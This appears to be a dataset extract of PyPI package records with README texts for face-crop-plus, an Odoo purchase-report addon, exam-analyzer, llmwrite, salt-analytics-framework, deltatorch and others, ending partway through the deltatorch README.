![Banner](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/banner.png)



## About

Image preprocessing package for automatic face alignment and cropping with additional features. It provides the following functionality:
1. **Face cropping** - face alignment and center-cropping using facial landmarks. Landmarks can be automatically predicted or, if they are already know, can be supplied through a separate file. It is possible to specify face factor, i.e., face area relative to the cropped image, and face extraction strategy, e.g., all faces or largest face per image.
2. **Face enhancement** - face image quality enhancement. If images are blurry or contain many small faces, quality enhancement model can be used to make the images clearer. Small faces in the image are automatically checked and enhanced if desired.
3. **Face parsing** - face attribute parsing and cropped image grouping to sub-directories. Face images can be grouped according to some facial attributes or some combination, such as _glasses_, _earrings and neckless_, _hats_. It is also possible to generate masks for facial attributes or some combination of them, for instance, _glasses_, _nose_, _nose and eyes_.

Please see _References_ section for more details about which models are used for each feature.

> **Note**: each feature can be used separately, e.g., if you just need to enhance the quality of blurry photos, or if you just need to generate attribute masks (like hats, glasses, face parts).

## Installation

The packages requires at least _Python 3.10_. You may also want to set up _PyTorch_ in advance from [here](https://pytorch.org/get-started/locally/). 

To install the package simply run:

```bash
pip install face-crop-plus
```

Or, to install it from source, run:
```bash
git clone https://github.com/mantasu/face-crop-plus
cd face-crop-plus && pip install .
```

## Quick Start

You can run the package from the command line:
```
face-crop-plus -i path/to/images
```

You can also use it in a Python script:
```python
from face_crop_plus import Cropper

cropper = Cropper(face_factor=0.7, strategy=""largest"")
cropper.process_dir(input_dir=""path/to/images"")
```

For a quick demo, you can experiment with [demo.py](https://github.com/mantasu/face-crop-plus/blob/main/demo/demo.py) file:
```bash
git clone https://github.com/mantasu/face-crop-plus
cd face-crop-plus/demo
python demo.py
```

For more examples, see _Examples_ section.

## Features

Here, some of the main arguments are described that control the behavior of each of the features. These arguments can be specified via command line or when initializing the `Cropper` class. For further details about how the `Cropper` class works, please refer to the documentation.

### Alignment and Cropping

The main feature is face alignment and cropping. The main arguments that control this feature:

* `landmarks` - if you don't want automatic landmark prediction and already have face landmark coordinates in a separate file, you can specify the path to it. See the table below for the expected file formats.

    | File format      | Description                                                                                                                                                                          |
    | :--------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
    | `.json`          | Expects a dictionary with the following example entries: `'image.jpg': [x1, y1, ...]`. I.e., keys are image file names and values are flattened arrays of face landmark coordinates. |
    | `.csv`           | Expects comma-separated values of where each line is of the form `image.jpg,x1,y1,...`. Note that it also expects the first line to be a header.                                     |
    | `.txt` and other | Similar to CSV file, but each line is expected to have space-separated values of the form `image.jpg x1 y1 ...`. No header is expected.                                              |

* `output_size` - the output size of the cropped face images. Can be either a tuple of 2 values (weight, height) or a single value indicating square dimensions

    | 200 × 200                           | 300 × 300                           | 300 × 200                           | 200 × 300                           |
    | :---------------------------------: | :---------------------------------: | :---------------------------------: | :---------------------------------: |
    | ![200x200](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/size_200x200.jpg) | ![300x300](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/size_300x300.jpg) | ![300x200](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/size_300x200.jpg) | ![200x300](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/size_200x300.jpg) |

* `face_factor` - the fraction of the face area relative to the output image. The value is between 0 and 1 and, the larger the value, the larger the face is in the output image.

    | 0.4                           | 0.55                            | 0.7                            | 0.85                            |
    | :---------------------------: | :-----------------------------: | :----------------------------: | :-----------------------------: |
    | ![0.4](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/factor_0.4.jpg) | ![0.55](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/factor_0.55.jpg) | ![0.55](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/factor_0.7.jpg) | ![0.55](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/factor_0.85.jpg) |

* `padding` - the type of padding (border mode) to apply after cropping the images. If faces are near edges, the empty areas after aligning those faces will be filled with some values. This could be _constant_ (leave black), _replicate_ (repeat the last value of the edge in the original image), _reflect_ (mirror the values before the edge).

    | Constant                                                                                               | Replicate                                                                                                | Reflect                                                                                              | Wrap                                                                                           |
    | :----------------------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------: | :--------------------------------------------------------------------------------------------------: | :--------------------------------------------------------------------------------------------: |
    | ![constant](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/padding_constant.jpg) | ![replicate](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/padding_replicate.jpg) | ![reflect](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/padding_reflect.jpg) | ![wrap](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/padding_wrap.jpg) |

* `det_threshold` - if automatic detection is desired, then detection threshold, which is a value between 0 and 1, can be specified to indicate when the detected face should be considered an actual face. Lower values allow more faces to be extracted, however they can be blurry and not non-primary, e.g., the ones in the background. Higher values only alow clear faces to be considered. It only makes sense to play around with this parameter when `strategy` is specified to return more than one face, e.g., _all_. For example, if it is `0.999`, the blurry face in the background in the examples above is not detected, however if the threshold `0.998`, the face is still detected. For blurrier images, thresholds may differ.

* `strategy` - the strategy to apply for cropping out images. This can be set to _all_, if all faces should be extracted from each image (suffixes will be added to each file name), _largest_, if only the largest faces should be considered (slowest), _best_ if only the first face (which has the best confidence score) per image should be considered.

### Quality Enhancement

Quality enhancement feature allows to restore blurry faces. It has one main argument:

* `enh_threshold` - quality enhancement threshold that tells when the image quality should be enhanced. It is the minimum average face factor, i.e., face area relative to the image, below which the whole image is enhanced. Note that quality enhancement is an expensive operation, thus set this to a low value, like `0.01` to only enhance images where faces are actually small. If your images are of reasonable quality and don't contain many tiny faces, you may want to set this to _None_ (or to a negative value if using command-line) to disable the model. Here are some of the examples of the extracted faces before and after enhancing the image:

    | Face 1                 | Face 2                 | Face 3                 | Face 4                 |
    | :--------------------: | :--------------------: | :--------------------: | :--------------------: |
    | ![b1](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f1_b.jpg) | ![b2](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f2_b.jpg) | ![b3](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f3_b.jpg) | ![b6](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f4_b.jpg) |
    | ![a1](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f1_a.jpg) | ![a2](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f2_a.jpg) | ![a3](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f3_a.jpg) | ![a6](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/f4_a.jpg) |


> Quality enhancement can be used as a separate feature to enhance images that contain faces. For an end user, it is a useful feature to boost the quality of photos. It is not suggested to enhance ultra high resolution images (>2000) because your GPU will explode. See _Pure Enhancement/Parsing_ section on how to run it as a stand-alone.


### Attribute Parsing

Face parsing to attributes allows to group output images by category and generate attribute masks for that category. Categorized images are put to their corresponding sub-folders in the output directory.
* `attr_groups` - dictionary specifying attribute groups, based on which the face images should be grouped. Each key represents an attribute group name, e.g., _glasses_, _earings and neckless_, _no accessories_, and each value represents attribute indices, e.g., `[6]`, `[9, 15]`, `[-6, -9, -15, -18]`, each index mapping to some attribute. Since this model labels face image pixels, if there is enough pixels with the specified values in the list, the whole face image will be put into that attribute category. For negative values, it will be checked that the labeled face image does not contain those (absolute) values. If it is None, then there will be no grouping according to attributes. Here are some group examples with 2 sample images per group:

    | Glasses  `[6]`           | Earrings and neckless  `[9, 15]`       | Hats, no glasses  `[18, -6]`     | No accessories  `[-6, -9, -15, -18]` |
    | :---------------------------: | :-----------------------------------------: | :-----------------------------------: | :---------------------------------------: |
    | ![ag11](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/glasses_1.jpg) | ![ag21](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/earrings_and_neckless_1.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/hats_no_glasses_1.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/no_accessories_1.jpg)      |
    | ![ag12](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/glasses_2.jpg) | ![ag21](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/earrings_and_neckless_2.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/hats_no_glasses_2.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/no_accessories_2.jpg)      |

* `mask_groups` - Dictionary specifying mask groups, based on which the face images and their masks should be grouped. Each key represents a mask group name, e.g., _nose_, _eyes and eyebrows_, and each value represents attribute indices, e.g., `[10]`, `[2, 3, 4, 5]`, each index mapping to some attribute. Since this model labels face image pixels, a mask will be created with 255 (white) at pixels that match the specified attributes and zeros (black) elsewhere. Note that negative values would make no sense here and having them would cause an error. Images are saved to sub-directories named by the mask group and masks are saved to sub-directories under the same name, except with `_mask` suffix. If it is None, then there will be no grouping according to mask groups. Here are some group examples with 1 sample image and its mask per group (for consistency, same images as before):

    | Glasses  `[6]`           | Earrings and neckless  `[9, 15]`       | Nose  `[10]`                     | Eyes and eyebrows  `[2, 3, 4, 5]` |
    | :---------------------------: | :-----------------------------------------: | :-----------------------------------: | :------------------------------------: |
    | ![ag11](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/glasses_1.jpg) | ![ag21](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/earrings_and_neckless_1.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/hats_no_glasses_1.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/no_accessories_1.jpg)   |
    | ![ag11](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/glasses_m.jpg ) | ![ag21](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/earrings_and_neckless_m.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/hats_no_glasses_m.jpg) | ![ag31](https://raw.githubusercontent.com/mantasu/face-crop-plus/main/assets/no_accessories_m.jpg)   |

> If both `attr_groups` and `mask_groups` are specified, first images are grouped according to face attributes, then images in each groups are further sub-grouped to different mask groups (along with their masks).


Here are the 19 possible face attributes (with `0` representing the neutral category):



|                     |                  |                  |
| ------------------- | ---------------- | ---------------- |
| `1` - skin          | `7` - left ear   | `13` - lower lip |
| `2` - left eyebrow  | `8` - right ear  | `14` - neck      |
| `3` - right eyebrow | `9` - earrings   | `15` - neckless  |
| `4` - left eye      | `10` - nose      | `16` - clothes   |
| `5` - right eye     | `11` - mouth     | `17` - hair      |
| `6` - eyeglasses    | `12` - upper lip | `18` - hat       |



## Examples

### Running via Command Line

You can run the package via command line by providing the arguments as follows:
```bash
face-crop-plus -i path/to/images --output-size 200 300 --face-factor 0.75 -d cuda:0
```

You can specify the command-line arguments via JSON config file and provide the path to it. Further command-line arguments would overwrite the values taken from the JSON file.
```bash
face-crop-plus --config path/to/json --attr-groups '{""glasses"": [6]}'
```

An example JSON config file is [demo.json](https://github.com/mantasu/face-crop-plus/blob/main/demo/demo.json). If you've cloned the repository, you can run from it:
```bash
face-crop-plus --config demo/demo.json --device cuda:0 # overwrite device
```

For all the available command line arguments, just type (although refer to documentation for more details):
```bash
face-crop-plus -h
```

> **Note**: you can use `fcp` as `face-crop-plus` alias , e.g., `fcp -c config.json`

### Pure Enhancement/Parsing

If you already have aligned and center-cropped face images, you can perform quality enhancement and face parsing without re-cropping them. Here is an example of enhancing quality of every face and parsing them to (note that none of the parameters described in _Alignment and Cropping_ section have any affect here):

```python
from face_crop_plus import Cropper

cropper = Cropper(
    det_threshold=None,
    enh_threshold=1, # enhance every image   
    attr_groups={""hats"": [18], ""no_hats"": [-18]},
    mask_groups={""hats"": [18], ""ears"": [7, 8, 9]},
    device=""cuda:0"",
)

cropper.crop(input_dir=""path/to/images"")
```

This would result in the following output directory structure:
```bash
└── path/to/images_faces
     ├── hats
     |    ├── hats       # Images with hats
     |    ├── hats_mask  # Hat masks for images in upper dir
     |    ├── ears       # Images with hats and visible ears
     |    └── ears_mask  # Ears masks for images in upper dir
     |
     └── no_hats
          ├── ears       # Masks with no hats and visible ears
          └── ears_mask  # Ears masks for images in upper dir
```

To just enhance the quality of images (e.g., if you have blurry photos), you can run enhancement feature separately:
```bash
face-crop-plus -i path/to/images -dt -1 -et 1 --device cuda:0
```

To just generate masks for images (e.g., as part of your research pipeline), you can run segmentation feature separately. This will only consider images for which the masks are actually present.
```bash
face-crop-plus -i path/to/images -dt -1 -et -1 -mg '{""glasses"": [6]}'
```

Please beware of the following:
* While you can perform quality enhancement on images of different sizes (because, due to large amount of computations, images are processed one by one), you cannot perform face parsing (attribute-based grouping/segmentation) if images have different dimensions (though a possible work around is to set the batch size to 1).
* It is not advised to perform quality enhancement after cropping the images since there is not enough information for the model on how to improve the quality. If you still need to enhance the quality after cropping, using larger image sizes, e.g., `512×512`, may help. Regardless whether you use it before or after cropping, do not use input images of spatial size over `2000×2000`, unless you have a powerful GPU.

### Preprocessing CelebA

Here is an example pipeline of how to pre-process [CelebA](https://mmlab.ie.cuhk.edu.hk/projects/CelebA.html) dataset. It is useful if you want to customize the cropped face properties, e.g., face factor, output size. It only takes a few minutes to pre-process the whole dataset using multiple processors and the provided landmarks:
1. Download the following files from _Google Drive_:
    * Download `img_celeba.7z` folder from [here](https://drive.google.com/drive/folders/0B7EVK8r0v71peklHb0pGdDl6R28?resourcekey=0-f5cwz-nTIQC3KsBn3wFn7A) and put it under `data/img_celeba.7z`
    * Download `annotations.zip` file from [here](https://drive.google.com/file/d/1xd-d1WRnbt3yJnwh5ORGZI3g-YS-fKM9/view) and put it under `data/annotations.zip`
2. Unzip the data:
    ```bash
    7z x data/img_celeba.7z/img_celeba.7z.001 -o./data
    unzip data/annotations.zip -d data
    ```
3. Create a script file, e.g., `preprocess_celeba.py`, in the same directory:
    ```python
    from face_crop_plus import Cropper
    from multiprocessing import cpu_count

    cropper = Cropper(
        output_size=256,
        face_factor=0.7,
        landmarks=""data/landmark.txt"",
        enh_threshold=None,
        num_processes=cpu_count(),
    )

    cropper.process_dir(""data/img_celeba"")
    ```
4. Run the script to pre-process the data:
    ```bash
    python preprocess_celeba.py
    ```
5. Clean up the data dir (remove the original images and the annotations):
    ```
    rm -r data/img_celeba.7z data/img_celeba
    rm data/annotations.zip data/*.txt
    ```

## Tips

1. When using `num_processes`, only set it to a larger value if you have enough GPU memory, or reduce `batch_size`. Unless you only perform face cropping with already known landmarks and don't perform quality enhancement nor face parsing, in which case set it to the number of CPU cores you have.
2. If you experience any of the following:
    * RuntimeError: CUDA error: an illegal memory access was encountered.
    * torch.cuda.OutOfMemoryError: CUDA out of memory.
    * cuDNN error: CUDNN_STATUS_MAPPING_ERROR.

   This is likely because you are processing images on too many processes or have a large batch size. If you run all 3 models on GPU, it may be helpful to just run on a single process with a larger batch size.

## References

This package uses the code and the pre-trained models from the following repositories:
* [PyTorch RetinaFace](https://github.com/biubug6/Pytorch_Retinaface) - 5-point landmark prediction
* [BSRGAN](https://github.com/cszn/BSRGAN) - super resolution and quality enhancement
* [Face Parsing PyTorch](https://github.com/zllrunning/face-parsing.PyTorch) - grouping by face attributes and segmentation

## Citation

If you find this package helpful in your research, you can cite the following:
```bibtex
@misc{face-crop-plus,
  author = {Mantas Birškus},
  title = {Face Crop Plus},
  year = {2023},
  publisher = {GitHub},
  journal = {GitHub repository},
  howpublished = {\url{https://github.com/mantasu/face-crop-plus}},
  doi = {10.5281/zenodo.7856749}
}
```
",mantasu/face-crop-plus
passlass,https://github.com/TheCodingFreakj/password-manager,0,48,48,"A simple python wrapper for creating passwords
","A simple python wrapper for creating passwords
",thecodingfreakj/password-manager
odoo-addon-purchase-report-date-format,https://github.com/OCA/purchase-reporting,1,2945,2600,"===========================
Purchase Report Date Format
===========================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fpurchase--reporting-lightgray.png?logo=github
    :target: https://github.com/OCA/purchase-reporting/tree/16.0/purchase_report_date_format
    :alt: OCA/purchase-reporting
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/purchase-reporting-16-0/purchase-reporting-16-0-purchase_report_date_format
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/141/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

Shows following datetime fields of purchase reports in date format instead of datetime,
since presenting dates up to seconds is too much or unnecessary in many purchase
transactions.

Request for Quotation print:

* Expected Date

Purchase Order print:

* Order Date
* Order Deadline
* Requested Date

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/purchase-reporting/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/purchase-reporting/issues/new?body=module:%20purchase_report_date_format%0Aversion:%2016.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Quartile Limited

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/purchase-reporting <https://github.com/OCA/purchase-reporting/tree/16.0/purchase_report_date_format>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","===========================
Purchase Report Date Format
===========================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fpurchase--reporting-lightgray.png?logo=github
    :target: https://github.com/OCA/purchase-reporting/tree/16.0/purchase_report_date_format
    :alt: OCA/purchase-reporting
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/purchase-reporting-16-0/purchase-reporting-16-0-purchase_report_date_format
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/141/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

Shows following datetime fields of purchase reports in date format instead of datetime,
since presenting dates up to seconds is too much or unnecessary in many purchase
transactions.

Request for Quotation print:

* Expected Date

Purchase Order print:

* Order Date
* Order Deadline
* Requested Date

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Quartile Limited

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/purchase-reporting `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/purchase-reporting
exam-analyzer,https://github.com/fearlessxjdx/ExamAnalyzer,3,529,529,"# exam_analyzer

## 使用指南

### 1. 安装 python 运行环境

已经安装过 python，且 python 版本>=3.7 可以跳过此步骤

python 版本低于 3.7 的，建议先卸载老版本的 python，再安装新版 python

推荐下载 [python3.10](https://www.python.org/downloads/release/python-31011/)

如果下载不动，请使用迅雷等下载工具

### 2. 建立班级文件夹，并放入学生的成绩报告单(PDF文件)

以班级为单位，新建文件夹，文件夹必须以'班'字结尾，例如：301班、302班、303班、……

然后将学生的 pdf 文件放入所在班级的文件夹，pdf 文件必须是官方网站下载的，否则可能出现解析错误，导致信息、分数不一致等情况。

### 3. 双击 `生成.bat` 文件

本着 `Pythonic` 理念，本人已将该工具包发布到 python 官方的 PyPI 上，感兴趣的老师欢迎加入开发。

`生成.bat` 文件中，包含了几条命令，双击后会自动下载本人发布的工具库，下载完成后便会运行，老师们只需等待执行完成即可
","# exam_analyzer

## 使用指南

### 1. 安装 python 运行环境

已经安装过 python，且 python 版本>=3.7 可以跳过此步骤

python 版本低于 3.7 的，建议先卸载老版本的 python，再安装新版 python

推荐下载 [python3.10](https://www.python.org/downloads/release/python-31011/)

如果下载不动，请使用迅雷等下载工具

### 2. 建立班级文件夹，并放入学生的成绩报告单(PDF文件)

以班级为单位，新建文件夹，文件夹必须以'班'字结尾，例如：301班、302班、303班、……

然后将学生的 pdf 文件放入所在班级的文件夹，pdf 文件必须是官方网站下载的，否则可能出现解析错误，导致信息、分数不一致等情况。

### 3. 双击 `生成.bat` 文件

本着 `Pythonic` 理念，本人已将该工具包发布到 python 官方的 PyPI 上，感兴趣的老师欢迎加入开发。

`生成.bat` 文件中，包含了几条命令，双击后会自动下载本人发布的工具库，下载完成后便会运行，老师们只需等待执行完成即可
",fearlessxjdx/examanalyzer
sar-handler,https://github.com/Felecort/SAR_Handler,0,255,255,"# This package contain the following functionality

- Adding speckl-noise to image
- Create csv dataset from images
- Creating Dataset and Dataloader
- Check metrics
  - GSMD
  - SSIM
- Filtering images with NN models
- And many other stuff


","# This package contain the following functionality

- Adding speckl-noise to image
- Create csv dataset from images
- Creating Dataset and Dataloader
- Check metrics
  - GSMD
  - SSIM
- Filtering images with NN models
- And many other stuff


",felecort/sar_handler
pysigma-backend-sentinelone,https://github.com/7RedViolin/pySigma-backend-sentinelone,1,0,0,,,7redviolin/pysigma-backend-sentinelone
project-processamento,https://github.com/Mauricio8583/Pacotes_processamento_python,0,589,589,"# image_processing

Description:
    The package image_processing is used to:
        Processing:
            - Histogram matching
            - Structural similarity
            - Resize image
        Utils:
            - Read image
            - Save image
            - Plot image
            - Plot result
            - Plot histogram

## Instalation
 Use the package manager [pip] to install package_name

 pip install package_name

## Usage
 python
  from package_name.module1_name import file1_name
  file1_name.my_function()

## Author
Mauricio Oliveira
","# image_processing

Description:
    The package image_processing is used to:
        Processing:
            - Histogram matching
            - Structural similarity
            - Resize image
        Utils:
            - Read image
            - Save image
            - Plot image
            - Plot result
            - Plot histogram

## Instalation
 Use the package manager [pip] to install package_name

 pip install package_name

## Usage
 python
  from package_name.module1_name import file1_name
  file1_name.my_function()

## Author
Mauricio Oliveira
",mauricio8583/pacotes_processamento_python
llmwrite,https://github.com/otakumesi/llm-write,6,936,919,"# LLM-Write (powered by GPT-3) :writing_hand:

__LLM make writing an article brazing fast :fire:.__

PyPi:
- https://pypi.org/project/llmwrite/

![LLM-Write Demo](https://github.com/otakumesi/gpt-write/blob/main/demo.gif?raw=true ""デモ"")

## :telescope: Overview
- This app is built with GPT-3.
- LLM-Write is the CLI tool for Intractive Automated Article Writing.  
- You can create articles, just answer the questions.   
- Since the language is specified in the LLM prompt and LLM is allowed to generate the text, it could theoretically be used in a variety of languages.  
    - However, the supported languages in the shell messages are only English and Japanese.


## :runner: Installation
```sh
pip install llmwrite
```

## :computer: Usage

```sh
# Set Environment ""OPENAI_API_KEY""
export OPENAI_API_KEY=sk-xxxxxxxxxxxxxxxxxxx

# Run
gptwrite
? Language? <Select Language>
# ...(Lots of questions come in to the interactive.)
```
","# LLM-Write (powered by GPT-3) :writing_hand:

__LLM make writing an article brazing fast :fire:.__

PyPi:
- https://pypi.org/project/llmwrite/

![LLM-Write Demo](https://github.com/otakumesi/gpt-write/blob/main/demo.gif?raw=true ""デモ"")

## :telescope: Overview
- This app is built with GPT-3.
- LLM-Write is the CLI tool for Intractive Automated Article Writing.  
- You can create articles, just answer the questions.   
- Since the language is specified in the LLM prompt and LLM is allowed to generate the text, it could theoretically be used in a variety of languages.  
    - However, the supported languages in the shell messages are only English and Japanese.


## :runner: Installation
```sh
pip install llmwrite
```

## :computer: Usage

```sh
# Set Environment ""OPENAI_API_KEY""
export OPENAI_API_KEY=sk-xxxxxxxxxxxxxxxxxxx

# Run
gptwrite
? Language? 
# ...(Lots of questions come in to the interactive.)
```
",otakumesi/llm-write
salt-analytics-framework,https://github.com/saltstack/salt-analytics-framework,34,1861,1812,"..
   include-starts-here

================================
What is Salt Analytics Framework
================================

It's a framework which extends `Salt`_ through the use of an `engine`_ that can collect,
process and forward analytics/metrics data.


Install
=======

Installing Salt Analytics Framework is as simple as:

.. code-block:: bash

   python -m pip install salt-analytics-framework


Configuration
=============

The minimal configuration to start salt analytics with `Salt`_ is to add it to Salt's engines
configuration:

.. code-block:: yaml

   engines:
     - analytics


Example Pipeline
----------------

.. code-block:: yaml

   beacons:
     memusage:
       - interval: 5
       - percent: 0.01%
     status:
       - interval: 5
       - time:
         - all
       - loadavg:
         - all

   analytics:
     collectors:
       beacons-collector:
         plugin: beacons
         beacons:
           - ""*""

     processors:
       noop-processor:
         plugin: noop

     forwarders:
       disk-forwarder:
         plugin: disk
         path: /var/cache/salt
         filename: events-dumped.txt
         pretty_print: true

     pipelines:
       my-pipeline:
         collect: beacons-collector
         process: noop-processor
         forward: disk-forwarder


Usage
=====

TBD

Contributing
============

The salt-analytics-framework project team welcomes contributions from the community.
For more detailed information, refer to `CONTRIBUTING`_.

.. _salt: https://github.com/saltstack/salt
.. _engine: https://docs.saltproject.io/en/latest/topics/engines/index.html
.. _CONTRIBUTING: https://github.com/saltstack/salt-analytics-framework/blob/main/CONTRIBUTING.md

..
   include-ends-here

Documentation
=============

The full documentation can be seen `here <https://salt-analytics-framework.readthedocs.io>`_.
","..
   include-starts-here

================================
What is Salt Analytics Framework
================================

It's a framework which extends `Salt`_ through the use of an `engine`_ that can collect,
process and forward analytics/metrics data.


Install
=======

Installing Salt Analytics Framework is as simple as:

.. code-block:: bash

   python -m pip install salt-analytics-framework


Configuration
=============

The minimal configuration to start salt analytics with `Salt`_ is to add it to Salt's engines
configuration:

.. code-block:: yaml

   engines:
     - analytics


Example Pipeline
----------------

.. code-block:: yaml

   beacons:
     memusage:
       - interval: 5
       - percent: 0.01%
     status:
       - interval: 5
       - time:
         - all
       - loadavg:
         - all

   analytics:
     collectors:
       beacons-collector:
         plugin: beacons
         beacons:
           - ""*""

     processors:
       noop-processor:
         plugin: noop

     forwarders:
       disk-forwarder:
         plugin: disk
         path: /var/cache/salt
         filename: events-dumped.txt
         pretty_print: true

     pipelines:
       my-pipeline:
         collect: beacons-collector
         process: noop-processor
         forward: disk-forwarder


Usage
=====

TBD

Contributing
============

The salt-analytics-framework project team welcomes contributions from the community.
For more detailed information, refer to `CONTRIBUTING`_.

.. _salt: https://github.com/saltstack/salt
.. _engine: https://docs.saltproject.io/en/latest/topics/engines/index.html
.. _CONTRIBUTING: https://github.com/saltstack/salt-analytics-framework/blob/main/CONTRIBUTING.md

..
   include-ends-here

Documentation
=============

The full documentation can be seen `here `_.
",saltstack/salt-analytics-framework
ezfinpy,https://github.com/renanmoretto/ezfinpy,4,0,0,,,renanmoretto/ezfinpy
deltatorch,https://github.com/mshtelma/deltatorch/,5,2357,2357,"# deltatorch

![![image](https://github.com/mshtelma/deltatorch/workflows/build/badge.svg)](https://github.com/mshtelma/deltatorch/actions/workflows/ci.yml/badge.svg)
![![image](https://github.com/mshtelma/deltatorch/workflows/build/badge.svg)](https://github.com/mshtelma/deltatorch/actions/workflows/flake8.yml/badge.svg)

## Concept

`deltatorch` allows users to directly use  `DeltaLake` tables as a data source for training using PyTorch. 
Using  `deltatorch`, users can create a PyTorch  `DataLoader` to load the training data. 
We support distributed training using PyTorch DDP as well. 



## Usage

### Requirements

- Python Version \> 3.8
- `pip` or `conda`

### Installation

- with `pip`:

```
pip install git+https://github.com/mshtelma/deltatorch
```
### Create PyTorch DataLoader to read our DeltaLake table

To utilize `deltatorch` at first, we will need a DeltaLake table containing training data we would like to use for training your PyTorch deep learning model. 
There is a requirement: this table must have an autoincrement ID field. This field is used by `deltatorch` for sharding and parallelization of loading. 
After that, we can use the `create_pytorch_dataloader` function to create PyTorch DataLoader, which can be used directly during training. 
Below you can find an example of creating a DataLoader for the following table schema :


```sql
CREATE TABLE TRAINING_DATA 
(   
    image BINARY,   
    label BIGINT,   
    id INT
) 
USING delta LOCATION 'path' 
```

